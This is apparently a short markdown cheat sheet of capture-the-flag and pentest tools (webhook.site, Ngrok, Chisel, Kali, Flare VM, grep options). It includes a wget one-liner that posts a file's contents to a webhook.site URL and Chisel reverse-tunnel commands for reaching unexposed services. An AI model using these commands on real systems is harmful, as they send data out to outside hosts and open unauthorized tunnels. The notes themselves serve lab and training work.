# Common tools

## Misc

- https://webhook.site

  - receive remote connections
  - `wget https://webhook.site/[id] --post-data="$(cat flag)"`

- [Ngrok](https://ngrok.com/)
  - reverse proxy, connect localhost and internet
- [Chisel](https://github.com/jpillora/chisel)
  - A fast TCP/UDP tunnel over HTTP
  - example use:
    - server:
      - `./chisel server -p 8001 --reverse`
    - client:
      - `./chisel client 10.10.14.13:8001 R:socks`
      - commonly used inside of docker container to tunnel unexposed service to our local environment
        - use proxy 1080 in local browser to find docker ip 172.17.0.1 directly, or whatever port is required, 172.17.0.1:3000
        - might have to add the ip 172.17.0.1 to /etc/hosts

## Quality of life

- [unf](https://github.com/io12/unf) - UNixize Filename
- [tldr](https://github.com/tldr-pages/tldr)
- [navi](https://github.com/denisidoro/navi)
  - `navi --cheatsh nmap`

## Operating systems

### Linux

- [Kali](https://www.kali.org/)
- [Blackarch](https://blackarch.org/)

- grep
  - `-r`, recursive
  - `-E`, regex
  - `-i`, case insensitive
  - `-v`, invert match, exclude
  - `grep "10.10.10.12" file.log | grep -v "gobuster"`

### Windows

- [Flare VM](https://github.com/mandiant/flare-vm)
